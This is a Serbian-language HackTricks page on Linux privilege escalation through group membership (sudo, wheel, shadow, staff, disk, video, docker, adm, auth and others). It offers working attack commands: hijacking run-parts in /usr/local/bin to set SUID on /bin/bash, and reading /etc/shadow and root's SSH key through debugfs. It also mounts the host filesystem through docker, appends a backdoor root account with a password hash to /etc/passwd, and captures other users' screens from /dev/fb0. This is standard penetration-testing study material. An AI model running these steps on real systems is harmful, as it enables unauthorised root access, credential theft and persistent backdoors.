# Zanimljive grupe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin grupe

### **PE - Method 1**

**Ponekad**, **podrazumevano (ili zato što je nekom software-u to potrebno)** unutar fajla **/etc/sudoers** možete pronaći neke od ovih linija:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To znači da **svaki korisnik koji pripada grupi sudo ili admin može izvršiti bilo šta kao sudo**.

Ako je to slučaj, da biste **postali root, samo možete izvršiti**:
```
sudo su
```
### PE - Metod 2

Pronađite sve suid binarne datoteke i proverite da li postoji binarna datoteka **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ako utvrdite da je binarni fajl **pkexec SUID binary** i da pripadate grupi **sudo** ili **admin**, verovatno možete izvršavati binarne fajlove kao sudo koristeći `pkexec`.\
To je zato što su to obično grupe navedene u **polkit policy**. Ova policy u osnovi određuje koje grupe mogu da koriste `pkexec`. Proverite je pomoću:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Tamo ćete pronaći kojim grupama je dozvoljeno da izvršavaju **pkexec**, a u nekim linux distribucijama se **podrazumevano** pojavljuju grupe **sudo** i **admin**.

Da biste **postali root, možete izvršiti**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ako pokušate da izvršite **pkexec** i dobijete ovu **grešku**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Nije problem u tome što nemate dozvole, već u tome što niste povezani bez GUI-ja**. Za ovaj problem postoji zaobilazno rešenje ovde: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrebne su vam **2 različite ssh sesije**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel grupa

**Ponekad**, **podrazumevano**, u datoteci **/etc/sudoers** možete pronaći ovu liniju:
```
%wheel	ALL=(ALL:ALL) ALL
```
To znači da **svaki korisnik koji pripada grupi wheel može da izvrši bilo šta koristeći sudo**.

Ako je to slučaj, da biste **postali root, samo izvršite**:
```
sudo su
```
## Shadow grupa

Korisnici iz **grupe shadow** mogu da **čitaju** datoteku **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Dakle, pročitajte fajl i pokušajte da **crackujete neke hash-eve**.

Kratka napomena o statusu zaključavanja prilikom analize hash-eva:
- Unosi sa `!` ili `*` uglavnom nisu interaktivni za prijavljivanje lozinkom.
- `!hash` obično znači da je lozinka postavljena, a zatim zaključana.
- `*` obično znači da nikada nije postavljen validan hash lozinke.
Ovo je korisno za klasifikaciju naloga čak i kada je direktno prijavljivanje blokirano.

## Staff grupa

**staff**: Omogućava korisnicima da dodaju lokalne izmene u sistem (`/usr/local`) bez potrebe za root privilegijama (imajte na umu da se izvršne datoteke u `/usr/local/bin` nalaze u PATH promenljivoj svakog korisnika i mogu da „nadjačaju“ izvršne datoteke u `/bin` i `/usr/bin` sa istim nazivom). Uporedite sa grupom „adm“, koja je više povezana sa monitoringom/bezbednošću. [\[izvor\]](https://wiki.debian.org/SystemGroups)

U Debian distribucijama, `$PATH` promenljiva pokazuje da će se `/usr/local/` izvršavati sa najvišim prioritetom, bez obzira na to da li ste privilegovani korisnik ili ne.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ako možemo da izvršimo hijacking nekih programa u `/usr/local`, lako možemo dobiti root.

Hijacking programa `run-parts` je jednostavan način da dobijemo root, jer će većina programa pokrenuti `run-parts` (kao što su crontab i prijavljivanje putem SSH-a).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ili kada se prijavi nova ssh sesija.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk grupa

Ova privilegija je gotovo **ekvivalentna root access-u**, jer možete pristupiti svim podacima unutar mašine.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Imajte na umu da pomoću debugfs takođe možete **upisivati datoteke**. Na primer, da biste kopirali `/tmp/asd1.txt` u `/tmp/asd2.txt`, možete uraditi:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Međutim, ako pokušate da **upisujete u datoteke čiji je vlasnik root** (kao što su `/etc/shadow` ili `/etc/passwd`), dobićete grešku "**Permission denied**".

## Video grupa

Pomoću komande `w` možete saznati **ko je prijavljen na sistem**, a ona će prikazati izlaz poput sledećeg:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** znači da je korisnik **yossi fizički prijavljen** na terminal na mašini.

**video grupa** ima pristup prikazu izlaza ekrana. U osnovi, možete posmatrati ekrane. Da biste to uradili, potrebno je da **preuzmete trenutnu sliku ekrana** u obliku sirovih podataka i utvrdite rezoluciju koju ekran koristi. Podaci ekrana mogu biti sačuvani u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći u `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Da biste **otvorili** **raw image**, možete koristiti **GIMP**, izaberite datoteku **`screen.raw`** i kao tip datoteke izaberite **Raw image data**:

![Disk Group - Video Group: Da biste otvorili raw image, možete koristiti GIMP, izaberite datoteku screen.raw i kao tip datoteke izaberite Raw image data](<../../../images/image (463).png>)

Zatim promenite Width i Height na vrednosti koje se koriste na ekranu i proverite različite Image Types (i izaberite onaj koji najbolje prikazuje ekran):

![Disk Group - Video Group: Zatim promenite Width i Height na vrednosti koje se koriste na ekranu i proverite različite Image Types (i izaberite onaj koji najbolje prikazuje ekran)](<../../../images/image (317).png>)

## Root Group

Izgleda da **članovi root grupe** podrazumevano mogu da imaju pristup **izmeni** nekih konfiguracionih datoteka **servisa**, datoteka **biblioteka** ili **drugih zanimljivih stvari** koje bi mogle da se iskoriste za escalation privileges...

**Proverite koje datoteke članovi root grupe mogu da menjaju**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker grupa

Možete **montirati root filesystem host mašine na volume instance**, tako da ona pri pokretanju odmah učita `chroot` u taj volume. Ovo vam praktično daje root na mašini.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Konačno, ako vam se nijedan od prethodnih predloga ne dopada ili iz nekog razloga ne funkcionišu (docker api firewall?), uvek možete pokušati da **pokrenete privilegovani container i pobegnete iz njega**, kao što je objašnjeno ovde:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ako imate dozvole za pisanje nad docker socket-om, pročitajte [**ovaj post o tome kako eskalirati privilegije zloupotrebom docker socket-a**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Grupa


{{#ref}}
./
{{#endref}}

## Adm Grupa

Obično **članovi** grupe **`adm`** imaju dozvole za **čitanje log** fajlova koji se nalaze unutar _/var/log/_.\
Zato, ako ste kompromitovali korisnika koji pripada ovoj grupi, definitivno bi trebalo da **pregledate logove**.

## Backup / Operator / lp / Mail grupe

Ove grupe su često vektori za **otkrivanje credential-a**, a ne direktni vektori do root-a:
- **backup**: može otkriti arhive sa konfiguracijama, ključevima, DB dump-ovima ili tokenima.
- **operator**: operativni pristup specifičan za platformu koji može dovesti do leak-a osetljivih runtime podataka.
- **lp**: redovi čekanja/spool-ovi za štampanje mogu sadržati sadržaj dokumenata.
- **mail**: mail spool-ovi mogu otkriti linkove za resetovanje, OTP-ove i interne credential-e.

Članstvo u ovim grupama tretirajte kao nalaz izlaganja podataka visoke vrednosti i pokušajte pivot kroz ponovnu upotrebu lozinki/tokena.

## Auth Grupa

Na OpenBSD-u **auth** grupa obično može da upisuje u foldere _**/etc/skey**_ i _**/var/db/yubikey**_ ako se koriste.\
Ove dozvole mogu biti zloupotrebljene pomoću sledećeg exploita za **eskalaciju privilegija** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
